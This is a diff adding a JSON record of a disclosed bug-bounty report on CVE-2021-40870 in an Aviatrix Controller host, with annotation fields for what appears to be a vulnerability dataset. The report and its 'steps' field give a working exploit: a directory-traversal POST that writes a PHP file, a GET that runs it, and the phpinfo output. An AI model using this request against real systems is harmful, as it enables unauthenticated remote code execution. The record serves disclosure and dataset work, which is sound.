@@ -1,0 +1,45 @@
+{
+  "reported_to": "Informatica",
+  "reported_by": "fdeleite ",
+  "title": "CVE-2021-40870 in [\u2588\u2588\u2588]",
+  "content": "\nAn issue was discovered in Aviatrix Controller 6.x before 6.5-1804.1922. Unrestricted upload of a file with a dangerous type is possible, which allows an unauthenticated user to execute arbitrary code via directory traversal.\nThe IP has a SSL certificate pointing to Informatica LLC.\ncurl -kvI https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nOutput\nCode 39 Bytes\n1 Server certificate:\n2*  subject: \u2588\u2588\u2588\u2588\u2588\u2588\nSteps To Reproduce\nFirst, run this request:\nCode 409 Bytes\n1POST /v1/backend1 HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\n4Connection: close\n5Content-Length: 136\n6Content-Type: application/x-www-form-urlencoded\n7Accept-Encoding: gzip\n8\n9CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/1yv4QQmkj4h4OdmmyT11tkiGf5M.php&data=RCE<?php phpinfo()?>\n10\nThe retrieve the content from file 1yv4QQmkj4h4OdmmyT11tkiGf5M.php\nCode 261 Bytes\n1GET /v1/1yv4QQmkj4h4OdmmyT11tkiGf5M.php HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\n3User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36\n4Connection: close\n5Content-Type: application/x-www-form-urlencoded\n6Accept-Encoding: gzip\nWhich is basically the output of the phpinfo function:\nResponse (truncated):\nCode 1.11 KiB\n1<tr class=\"h\"><th>Variable</th><th>Value</th></tr>\n2<tr><td class=\"e\">SCRIPT_URL </td><td class=\"v\">/v1/1.php </td></tr>\n3<tr><td class=\"e\">SCRIPT_URI </td><td class=\"v\">https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/v1/1.php </td></tr>\n4<tr><td class=\"e\">HTTPS </td><td class=\"v\">on </td></tr>\n5<tr><td class=\"e\">SSL_SERVER_S_DN_C </td><td class=\"v\">US </td></tr>\n6<tr><td class=\"e\">SSL_SERVER_S_DN_ST </td><td class=\"v\">California </td></tr>\n7<tr><td class=\"e\">SSL_SERVER_S_DN_L </td><td class=\"v\">Redwood City </td></tr>\n8<tr><td class=\"e\">SSL_SERVER_S_DN_O </td><td class=\"v\">Informatica LLC </td></tr>\n9<tr><td class=\"e\">SSL_SERVER_S_DN_OU </td><td class=\"v\">\u2588\u2588\u2588\u2588\u2588\u2588 </td></tr>\n10<tr><td class=\"e\">SSL_SERVER_S_DN_CN </td><td class=\"v\">\u2588\u2588\u2588\u2588\u2588\u2588 </td></tr>\n11<tr><td class=\"e\">SSL_SERVER_I_DN_C </td><td class=\"v\">US </td></tr>\n12<tr><td class=\"e\">SSL_SERVER_I_DN_O </td><td class=\"v\">HydrantID (Avalanche Cloud Corporation) </td></tr>\n13<tr><td class=\"e\">SSL_SERVER_I_DN_CN </td><td class=\"v\">HydrantID SSL ICA G2 </td></tr>\n14<tr><td class=\"e\">SSL_SERVER_SAN_DNS_0 </td><td class=\"v\">\u2588\u2588\u2588 </td></tr>\n15<tr><td class=\"e\">SSL_VERSION_INTERFACE </td><td class=\"v\">mod_ssl/2.4.39 </td></tr>\nImpact\nAn unauthenticated, 3rd-party attacker or adversary can execute remote code\nSupporting Material/References\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40870\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Code Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1636985400,
+  "report_url": "https://hackerone.com/reports/1360593",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a POST request to the vulnerable endpoint with a crafted payload that includes directory traversal and a PHP file upload: POST /v1/backend1 HTTP/1.1 with CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/1yv4QQmkj4h4OdmmyT11tkiGf5M.php&data=RCE<?php phpinfo()?>"
+    ],
+    [
+      2,
+      "Retrieve the uploaded PHP file to confirm remote code execution: GET /v1/1yv4QQmkj4h4OdmmyT11tkiGf5M.php HTTP/1.1"
+    ]
+  ],
+  "vuln_description": "An unrestricted file upload vulnerability in Aviatrix Controller allows unauthenticated attackers to upload malicious PHP files via directory traversal, leading to remote code execution.",
+  "reason": "The attack involves a straightforward file upload with directory traversal, a well-known vulnerability pattern. No complex interactions or novel logic is required.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an unauthenticated file upload leading to arbitrary code execution via directory traversal. The methodology described focuses on authentication and authorization bypasses within the same application context, specifically by swapping user sessions or resource IDs. However, this vulnerability does not require authentication or involve user sessions, nor does it involve swapping resource IDs within the same application context. Instead, it exploits a file upload flaw to achieve RCE, which is outside the scope of the described methodology.",
+    "is_detectable": false
+  }
+}
